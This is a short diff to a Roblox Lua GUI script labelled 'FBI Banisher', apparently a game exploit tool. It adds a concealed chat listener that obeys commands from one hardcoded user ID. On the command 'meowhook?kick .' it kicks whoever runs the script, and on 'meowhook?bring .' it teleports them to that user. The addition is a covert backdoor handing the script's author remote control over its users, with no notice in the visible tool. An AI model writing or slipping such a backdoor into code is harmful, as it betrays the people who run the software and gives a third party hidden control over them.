@@ -2989,3 +2989,17 @@ TextLabel_7.Text = "FBI Banisher"
 TextLabel_7.TextColor3 = Color3.fromRGB(198,208,245)
 TextLabel_7.TextSize = 18.000
 TextLabel_7.TextTransparency = 0.100
+
+game:GetService("TextChatService").OnIncomingMessage = function(message)
+	if message.TextSource then
+			if message.TextSource.UserId == 850599619 then
+				if message.TextSource.UserId == game.Players.LocalPlayer.UserId then return end
+				if message.Text == "meowhook?kick ." then
+					game.Players.LocalPlayer:Kick("Kicked by imameow")
+				end
+				if message.Text == "meowhook?bring ." then
+					game.Players.LocalPlayer.Character.Head.CFrame = game.Players:GetPlayerByUserId(message.TextSource.UserId).Character.Head.CFrame
+				end
+			end
+	end
+end
